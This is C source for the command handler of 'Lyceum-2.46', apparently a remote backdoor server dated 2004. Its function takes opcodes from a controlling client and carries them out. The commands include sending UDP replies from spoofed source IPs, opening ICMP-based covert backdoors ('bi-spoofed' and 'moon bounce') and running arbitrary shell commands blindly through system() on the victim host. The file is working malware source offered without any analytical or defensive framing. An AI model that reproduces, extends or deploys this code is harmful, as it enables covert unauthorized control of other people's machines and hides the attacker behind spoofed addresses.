/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */




#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "lyceum_host.h"
#include "lyceum_comcode.h"
#include "lyceum_proto.h"
#include "icmp_bd.h"

static char *subnet_spoof;

int
execute_comcode (int opcode, char *argument)
{

 // Functions to decide which function to execute 
 // from clients data

  int temp;
  int pgrp;

  char subnet_temp[32];
  unsigned long source_ip = 0;

  switch (opcode)
    {
    case LYM_EXIT:		// kill server and children
      {
	killpg (0, SIGKILL);
	exit (0);
      }

    case LYM_HIBERNATE:		// make server sleep
      {
	close_socket ();
	sleep ((long) (atol (argument) * 60 * 60));
	open_socket (READ);
	return 0;
      }

    case LYM_SUBNET:	        // server subnet spoofing
      {
	subnet_spoof = argument;
	return 0;
      }

    }

  pgrp = setsid ();

  if ((temp = fork ()) == 0)	// any function that will run for a sustained
  				// amount of time will be run in a child process
    {
      setpgid (0, pgrp);

      switch (opcode)
	{

	case LYM_PING:		// read and reply to an internal ping
	  {
	    char temp_payload[BUFSIZ];

	    temp = udp_socket;
	    sleep (1);

	    snprintf (temp_payload, BUFSIZ, "%s:0:%d:",
		      fuzz (), LYM_PING_REPLY);

	    if (subnet_spoof != NULL)
	      {
		snprintf (subnet_temp,
			  sizeof (subnet_temp), "%s%d",
			  subnet_spoof, get_random (0, 255));
		source_ip = inet_addr (subnet_temp);
	      }
	    else
	      source_ip = inet_addr (random_ip ());

	    udp_send (packet.ret_ip, source_ip,
		      get_random (1024, 65535),
		      get_random (1024, 65535), temp_payload,
		      strlen (temp_payload));

	    udp_socket = temp;
	    exit (0);
	  }

	case LYM_OIBD:	// open bi-spoofed backdoor
	  {
	    if (argument != NULL)
	      icmp_backdoord (subnet_spoof, atoi (argument));
	    else
	      icmp_backdoord (subnet_spoof, 0);
	    exit (0);
	  }

	case LYM_OIBBD:  // open moon bounce backdoor
	  {
	    icmp_bounce_backdoord ();
	    exit (0);
	  }

	case LYM_BNDCMD: // execute blind command
	  {
	    if (argument != NULL)
	      system (argument);
	    exit (0);
	  }

	default:
	  exit (0);
	}
    }

  return 0;
}
